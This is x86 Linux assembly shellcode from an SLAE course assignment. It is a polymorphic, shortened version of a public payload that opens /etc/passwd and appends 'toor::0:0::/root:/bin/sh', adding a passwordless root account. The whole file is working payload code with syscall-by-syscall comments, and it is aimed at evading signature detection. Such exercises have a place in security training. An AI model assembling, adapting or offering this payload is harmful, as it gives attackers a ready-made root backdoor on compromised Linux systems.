; SLAE Assignment 6: Append Passwd (morphed)
; http://shell-storm.org/shellcode/files/shellcode-561.php
; Original Shellcode Length:	107 
; Morphed Shellcode Length:		82

global _start
section .text
_start:
	jmp short stage

append:
	pop esi
	;mov byte [esi+6], 0x30
	;mov byte [esi+8], 0x30
	cdq
	mov byte [esi+24], dl

	push byte 0x5 				; #define __NR_open 5
	pop eax 					; int open(const char *pathname, int flags);
	push edx
	push byte 0x64 				; d
	push word 0x7773			; ws
	push 0x7361702f				; sap/
	push 0x6374652f				; cte/
	mov ebx, esp 				; *pathname -> /etc/passwd
	xor ecx, ecx 		
	inc ecx 					; flags = 1		#define O_WRONLY        00000001
	mov ch, 0x4 				; flags = 401	#define O_NOCTTY        00000400
	int 0x80 					; open

	xchg eax, ebx 				; fd 
	push byte 0x4 				; #define __NR_write 4
	pop eax 					; ssize_t write(int fd, const void *buf, size_t count);
	mov ecx, esi 				; *buf -> toor::0:0::/root:/bin/sh
	push byte 0x19 				; length = 25 bytes
	pop edx 					; count = 25
	int 0x80 					; write

	push byte 0x1 				; #define __NR_exit 1
	pop eax 					; int exit(int status)
	int 0x80 					; exit

stage:
	call append
	usr: db "toor::0:0::/root:/bin/shC"
